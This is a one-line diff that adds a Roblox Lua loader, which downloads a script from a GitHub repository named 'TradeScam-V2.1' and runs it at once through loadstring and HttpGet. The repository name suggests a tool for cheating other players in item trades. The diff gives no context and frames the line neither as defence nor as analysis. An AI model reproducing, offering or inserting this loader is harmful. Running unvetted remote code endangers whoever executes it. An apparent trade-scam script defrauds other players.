@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FourRun/TradeScam-V2.1/main/FRH.Lua'))()
